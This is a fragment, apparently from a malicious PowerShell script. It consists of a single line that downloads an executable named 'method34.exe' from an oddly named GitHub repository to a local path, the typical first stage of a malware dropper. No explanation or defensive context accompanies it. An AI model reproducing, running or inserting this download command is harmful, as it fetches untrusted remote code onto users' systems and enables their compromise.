...
(New-Object Net.WebClient).DownloadFile('https://github.com/taxesmmmm-collab/tsetinyourmymmas-ass/blame/561e8bf0611a7695b3d644d65a524f2ee30f78db/method34.exe', $m);
